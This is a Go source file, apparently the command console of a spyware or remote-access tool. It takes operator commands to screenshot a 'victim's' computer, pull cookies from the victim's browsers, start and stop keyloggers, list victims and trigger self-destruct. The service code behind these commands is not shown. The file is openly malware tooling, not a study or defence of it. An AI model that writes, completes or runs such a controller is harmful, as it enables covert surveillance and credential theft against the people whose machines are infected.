package main

import (
	"bufio"
	"fmt"
	"main/models"
	"main/repo"
	"main/service"
	"main/utils"
	"os"
	"strings"
)

var aliasRepo = &repo.AliasRepo{Aliases: map[string]string{}}

var commands = map[string]func(command *models.Command, repo *repo.AliasRepo) error{
	"alias":           service.ExecuteAliasCommand,
	"screenshot":      service.ExecuteScreenshot,
	"cookies":         service.ExecuteTextFileCommand,
	"stop-keylog":     service.ExecuteStopCommand,
	"stop-lazyKeylog": service.ExecuteStopCommand,
	"self-destruct":   service.ExecuteSelfDestruct,
	"keylog":          service.ExecuteTextFileCommand,
	"victims":         service.ExecuteGetVictims,
	"lazyKeylog":      service.ExecuteTextFileCommand,
}

func parseCommand(comm []string) *models.Command {
	if len(comm) < 2 {
		return nil
	}
	comType := commandType(comm[1])
	if comType == -1 {
		return &models.Command{Method: utils.POST, Command: comm[0], Body: comm[1:]}
	}
	return &models.Command{Method: commandType(comm[1]), Command: comm[0], Body: comm[2:]}
}

func commandType(com string) int {
	switch com {
	case "get":
		return utils.GET
	case "set":
		return utils.SET
	case "post":
		return utils.POST
	default:
		return -1
	}
}

func readCommand() {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("> ")
		comm, _ := reader.ReadString('\n')
		comm = strings.Trim(comm, "\r\n")
		switch comm {
		case "exit":
			return
		case "help":
			printHelp()
		default:
			comms := strings.Split(comm, " ")
			com := parseCommand(comms)
			if com == nil || commands[com.Command] == nil {
				fmt.Println("It is not a recognized command")
			} else {
				err := commands[com.Command](com, aliasRepo)
				if err != nil {
					fmt.Println(err)
				}
			}
		}
	}
}

func printHelp() {
	fmt.Println("HELP SCREEN")
	fmt.Println("screenshot [get|post] [<victim> | <alias>]        Screenshots the victim's computer")
	fmt.Println("alias [get | set <key> <value>]    			   Puts an alias of the key to have the value as value to be used as human-readable form to be used")
	fmt.Println("cookies [get|post] [<victim> | <alias>]           Gets the cookies from the all the victim's browser")
	fmt.Println("help                   				           Prints this message")
	fmt.Println("exit                   				           service.Exits the program")
}

func main() {
	readCommand()
}
